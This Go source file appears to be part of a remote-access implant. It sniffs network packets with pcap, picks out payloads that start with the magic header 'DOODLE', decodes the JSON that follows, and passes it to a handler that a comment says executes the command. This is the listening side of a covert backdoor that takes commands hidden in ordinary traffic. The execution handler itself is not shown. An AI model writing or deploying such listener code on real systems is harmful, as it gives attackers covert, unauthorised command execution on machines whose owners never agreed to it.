// This contains the packet parsing logic for the listening agent
package agent

import (
	"bytes"
	"encoding/json"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

var magicHeader = []byte{0x44, 0x4F, 0x4F, 0x44, 0x4C, 0x45} // "DOODLE"

// hasMagicHeader checks to see if incoming packets have the magic header as their payload
func hasMagicHeader(payload []byte) bool {
	return len(payload) >= len(magicHeader) && bytes.Equal(payload[:len(magicHeader)], magicHeader) // Checks for match
}

// ReadPackets reads the packets from the open pcap handle
func ReadPackets(handle *pcap.Handle) error {
	source := gopacket.NewPacketSource(
		handle,
		handle.LinkType(),
	)

	// Read packets as they come in
	for packet := range source.Packets() {
		// Application layer data of the packet
		appLayer := packet.ApplicationLayer()
		if appLayer == nil {
			continue
		}

		// Application layer payload
		payload := appLayer.Payload()
		// Check for magic header
		if hasMagicHeader(payload) {
			var message message.Message
			body := payload[len(magicHeader):] // Strip the magic header to leave raw JSON behind
			json.Unmarshal(body, &message) // Turn the JSON into a Message struct
			handleMessage(&message) // Handle the message (execute command)
		}
	}

	return nil
}
